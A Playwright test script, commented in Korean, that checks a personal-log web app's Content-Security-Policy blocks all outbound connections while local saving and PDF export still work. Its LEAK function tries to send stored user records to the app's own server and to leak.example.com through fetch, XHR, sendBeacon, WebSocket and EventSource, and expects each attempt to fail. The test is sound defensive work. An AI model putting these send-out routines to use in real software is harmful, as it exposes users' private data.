// 공통 안전장치: 어느 페이지에서든 잡히지 않은 오류(pageerror)가 나면 이 점검을 실패로 끝낸다
require('../lib/guard.cjs');
/* v1.13.0 21차(2026-11-16) 사용자 요청: 기록은 개인 휴대폰에만 저장
   웹 주소로 여는 앱(PWA)·오프라인 파일 모두, 앱 화면이 어떤 서버로도(같은 주소의 서버 포함) 연결을 만들 수 없게 막혀 있는지 본다.
   - 기록을 남긴 뒤 fetch·XMLHttpRequest·sendBeacon·WebSocket·EventSource로 같은 주소와 다른 주소에 기록을 보내 보려 해도 요청이 하나도 나가지 않음
   - 그 상태에서도 앱이 열리고 기록·진료 PDF(그림 라이브러리 불러오기)가 동작함
   - 서비스 워커는 앱 파일만 받고, 앱을 연 뒤에는 앱 파일 말고 아무것도 받지 않음 */
const path=require('path'), fs=require('fs'), http=require('http');
const ROOT=path.join(__dirname,'..','..');
const PUB=path.join(ROOT,'public'), OFF=path.join(ROOT,'dist','uc-table-offline.html');
const TMP=process.env.TEST_TMP||path.join(ROOT,'.test-out');
const DIR=path.join(TMP,'v1130d_site'); fs.rmSync(DIR,{recursive:true,force:true}); fs.mkdirSync(DIR,{recursive:true}); fs.cpSync(PUB,DIR,{recursive:true});
const { chromium } = require('playwright');
const F=[]; const need=(c,m)=>{if(!c){F.push(m); console.log('  ✗ '+m)} else console.log('  ✓ '+m)};
const TYPES={".html":"text/html; charset=utf-8",".js":"text/javascript",".webmanifest":"application/manifest+json",".png":"image/png",".woff2":"font/woff2"};
const hits=[];   // 서버가 받은 요청(경로)
const srv=http.createServer((q,r)=>{hits.push(q.method+' '+q.url); let u=decodeURIComponent(q.url.split("?")[0]); if(u.endsWith("/")) u+="index.html";
  const f=path.join(DIR,u); if(!f.startsWith(DIR)||!fs.existsSync(f)){r.writeHead(404);return r.end()}
  r.writeHead(200,{"Content-Type":TYPES[path.extname(f)]||"application/octet-stream"}); r.end(fs.readFileSync(f))});
const SEED=()=>{S.consent={date:today()}; S.onb="done"; S.persist="na"; S.logs[today()]={...BLANK_LOG(),day:2,memo:"개인 기록"}; save()};
// 앱 화면 안에서 기록을 바깥으로 보내 보는 시도들(모두 막혀야 함)
const LEAK=async(base)=>{const data=encodeURIComponent(JSON.stringify(S.logs).slice(0,200)); const tries=[];
  const t=async(name,fn)=>{try{await fn(); tries.push(name+':보냄')}catch(e){tries.push(name+':막힘')}};
  for(const host of [base,"https://leak.example.com/"]){
    await t("fetch "+host,()=>fetch(host+"leak-fetch?d="+data,{method:"POST",body:data}));
    await t("xhr "+host,()=>new Promise((ok,no)=>{const x=new XMLHttpRequest(); x.open("POST",host+"leak-xhr?d="+data); x.onload=ok; x.onerror=no; x.send(data)}));
    await t("beacon "+host,async()=>{if(!navigator.sendBeacon(host+"leak-beacon",data)) throw new Error("refused")});
    await t("ws "+host,()=>new Promise((ok,no)=>{const w=new WebSocket(host.replace(/^http/,"ws")+"leak-ws"); w.onopen=ok; w.onerror=no; setTimeout(no,800)}));
    await t("sse "+host,()=>new Promise((ok,no)=>{const s=new EventSource(host+"leak-sse?d="+data); s.onopen=()=>{s.close();ok()}; s.onerror=()=>{s.close();no()}; setTimeout(no,800)}));
  }
  await new Promise(r=>setTimeout(r,600)); return tries};
(async()=>{
  await new Promise(res=>srv.listen(0,"127.0.0.1",res)); const url=`http://127.0.0.1:${srv.address().port}/`;
  const b=await chromium.launch();
  for(const [label,open] of [["웹 주소(PWA)",async p=>{await p.goto(url)}],["오프라인 파일",async p=>{await p.goto('file://'+OFF)}]]){
    console.log('== '+label);
    const ctx=await b.newContext(); const p=await ctx.newPage(); const out=[];
    await p.route('https://leak.example.com/**',r=>{out.push(r.request().url().slice(0,80)); r.fulfill({body:'ok'})});   // 다른 주소로 실제로 나간 요청(콘텐츠 보안 정책에 막히면 여기까지 오지 않음)
    await open(p); await p.waitForFunction(()=>typeof render==="function"&&!!document.querySelector('#main')?.firstChild,null,{timeout:30000});
    await p.evaluate(SEED); await p.reload(); await p.waitForFunction(()=>typeof render==="function"&&!!document.querySelector('#main')?.firstChild,null,{timeout:30000});
    const csp=await p.evaluate(()=>document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content||"");
    need(/connect-src 'none'/.test(csp)&&/default-src 'none'/.test(csp)&&/form-action 'none'/.test(csp),`콘텐츠 보안 정책이 모든 연결을 막음 (${(csp.match(/connect-src [^;]*/)||["없음"])[0]})`);
    const n0=hits.length; const tries=await p.evaluate(LEAK,label.startsWith("웹")?url:"http://127.0.0.1:"+srv.address().port+"/");
    const leaked=hits.slice(n0).filter(h=>/leak/.test(h));
    need(!out.length&&!leaked.length,`기록을 바깥으로 보내려 해도 요청이 나가지 않음 (다른 주소 ${out.length}건, 앱 주소 서버 ${leaked.length}건: ${[...out,...leaked].slice(0,3).join(' | ')})`);
    need(tries.filter(t=>!t.startsWith('beacon')).every(t=>t.endsWith(':막힘')),`보내기 시도(fetch·XHR·WebSocket·EventSource)가 모두 오류로 막힘 (${tries.filter(t=>!t.startsWith('beacon')&&!t.endsWith(':막힘')).join(', ')})`);
    // 막아도 앱 기능은 그대로: 기록 저장, 진료 PDF 라이브러리 불러오기
    const ok=await p.evaluate(async()=>{const before=Object.keys(S.logs).length; S.logs[addDays(today(),-1)]={...BLANK_LOG(),day:1}; save();
      let pdf=false; try{ if(typeof loadPdfLibs==="function"){await loadPdfLibs(); pdf=!!(window.jspdf&&window.html2canvas)} else pdf=null }catch(e){pdf="err:"+e.message}
      return {saved:Object.keys(JSON.parse(localStorage.getItem(KEY)||'{"logs":{}}').logs||{}).length>before, pdf}});
    need(ok.saved,'막아도 기록은 이 기기에 저장됨');
    need(ok.pdf===true||ok.pdf===null,`막아도 진료 PDF 라이브러리를 불러옴 (${ok.pdf})`);
    if(label.startsWith("웹")){ const after=hits.slice(n0).filter(h=>!/leak/.test(h)); need(after.every(h=>/^GET \/(|index\.html|app\.js|sw\.js|manifest\.webmanifest|icon-[^/]*|apple-touch-icon\.png|privacy\.html|accessibility\.html|fonts\/[^/]*|vendor\/[^/]*)(\?.*)?$/.test(h)),`앱을 연 뒤 서버가 받은 요청은 앱 파일뿐 (${after.filter(h=>!/^GET \/(|index\.html|app\.js|sw\.js|manifest|icon|apple|privacy|accessibility|fonts|vendor)/.test(h)).slice(0,3).join(' | ')})`) }
    await ctx.close();
  }
  need(fs.readFileSync(path.join(PUB,'privacy.html'),'utf8').includes('어떤 서버와도 연결하지 못하게 막아'),'개인정보 처리방침에 연결을 막아 둔 것을 적음');
  await b.close(); srv.close();
  if(F.length){console.error('FAIL\n'+F.join('\n')); process.exitCode=1} else console.log('검증 통과');
})().catch(e=>{console.error(e); process.exitCode=1; srv.close()});
